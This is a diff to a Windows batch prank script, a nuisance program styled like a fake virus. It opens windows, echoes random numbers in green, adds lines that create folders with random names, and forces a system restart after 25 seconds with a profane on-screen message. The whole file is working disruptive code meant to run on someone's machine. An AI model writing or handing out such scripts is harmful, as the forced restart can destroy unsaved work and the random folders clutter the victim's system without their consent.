@@ -3,6 +3,10 @@
 color 02
 echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
 Start cmd
+md %random% %random% %random% %random% %random%
+md %random% %random% %random% %random% %random%
+md %random% %random% %random% %random% %random%
+md %random% %random% %random% %random% %random%
 Start notepad
 shutdown /r /t 25 /c "PC FUCKING"​
 start explorer
